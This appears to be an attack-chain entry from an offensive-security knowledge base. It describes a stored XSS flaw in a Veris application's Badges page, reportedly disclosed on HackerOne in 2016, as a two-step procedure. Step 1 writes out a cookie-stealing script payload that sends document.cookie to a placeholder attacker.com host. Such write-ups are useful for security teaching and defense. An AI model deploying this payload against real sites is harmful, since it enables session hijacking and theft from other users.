---
id: ac-veris-stored-xss-badges-2016
tags:
  - xss
  - stored-xss
  - web-injection
  - session-hijacking
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-Stored-XSS-Payload-in-Badges-Table]]'
  - '[[procedures/Trigger-and-Observe-XSS-Execution]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:26.839Z'
description: >-
  A stored cross-site scripting attack exploiting insufficient input
  sanitization in the Veris application's Badges page data table, allowing
  injection of malicious JavaScript that executes for all viewing users.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in Veris Badges Page for Session Hijacking and Data Theft

Multi-stage attack chain demonstrating a complete stored XSS workflow in the Veris application, reported on HackerOne in 2016. The vulnerability allows attackers to store malicious JavaScript in the Badges page data table, which executes in the context of any user viewing the page, enabling session theft, phishing, or data exfiltration.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Payload Injection] --> B[Payload Execution]
    B --> C[Impact: Session Hijack/Data Theft]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome with developer tools)
- Optional: Proxy tool like Burp Suite for payload crafting

### Target Environment

- Veris web application
- Access to user input fields on the Badges page
- No special ports or services required beyond standard HTTP/HTTPS

### Initial Access Requirements

- Valid user account in Veris application
- Ability to submit data to the Badges page (e.g., via form or API)
- Network access to the application

## Detailed Attack Procedures

### Step 1: Payload Injection
procedure: [[procedures/Inject-Stored-XSS-Payload-in-Badges-Table]]

**Objective**: Submit a malicious JavaScript payload to the Badges page data table, where it is stored without sanitization.

**Instructions**: Identify the input field or form on the Badges page that populates the data table (e.g., badge name, description, or metadata field). Craft a simple payload like `<script>alert('XSS')</script>` or a more advanced one for session theft, such as `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`. Submit the payload via the application's interface.

**Expected Output**: The payload is accepted and stored in the database without error.

**Success Indicators**:
- No validation errors on submission
- Payload appears in the data table when viewed by the attacker

### Step 2: Trigger and Observe Execution
procedure: [[procedures/Trigger-and-Observe-XSS-Execution]]

**Objective**: View the Badges page to trigger execution of the stored payload in the victim's browser context.

**Instructions**: Log in as a different user or share the Badges page link. Load the page containing the data table. The payload executes automatically upon rendering the unsanitized content.

**Expected Output**: JavaScript alert or redirect to attacker's server, confirming execution.

**Success Indicators**:
- Alert box or network request to attacker's domain
- Captured cookies or session data on attacker's server

## Attack Chain Summary

### Key Achievements

1. Successful injection of persistent JavaScript payload into the Badges data table
2. Execution of arbitrary code in the context of viewing users
3. Potential for session hijacking or data theft from authenticated users

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
